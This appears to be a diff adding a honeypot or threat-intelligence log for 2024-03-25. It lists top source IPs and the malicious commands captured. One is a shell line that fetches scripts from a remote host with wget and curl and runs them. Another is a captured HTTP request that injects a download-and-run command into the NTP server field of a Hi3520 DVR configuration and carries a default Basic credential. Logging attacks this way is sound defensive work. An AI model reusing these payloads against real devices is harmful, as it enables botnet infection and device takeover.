@@ -1,0 +1,21 @@
+Top 5 IPs for 2024-03-25 :
+
+189.146.75.99
+14.37.217.19
+175.214.129.143
+220.83.209.195
+221.163.214.3
+
+Malcious Commands seen:
+
+cd /data/local/tmp/; busybox wget http://103.188.244.189/w.sh; sh w.sh; curl http://103.188.244.189/c.sh; sh c.sh; wget http://103.188.244.189/wget.sh; sh wget.sh; curl http://103.188.244.189/wget.sh; sh wget.sh; busybox wget http://103.188.244.189/wget.sh; sh wget.sh; busybox curl http://103.188.244.189/wget.sh; sh wget.sh
+
+POST /cn/cmd HTTP/1.1
+Host:<HOST-IP>
+Accept-Encoding: gzip, deflate
+Content-Length: 334
+Authorization: Basic cm9vdDppY2F0Y2g5OQ==
+User-Agent: Abcd
+
+<?xml version=\"1.0\" encoding=\"UTF-8\"?><DVR Platform=\"Hi3520\"><SetConfiguration File=\"service.xml\"><![CDATA[<?xml version=\"1.0\" encoding=\"UTF-8\"?><DVR Platform=\"Hi3520\"><Service><NTP Enable=\"True\" Interval=\"20000\" Server=\"time.nist.gov&wget -O- http://91.92.241.246/ohshit.sh|sh;echo DONE\"/></Service></DVR>]]></SetConfiguration></DVR>
+
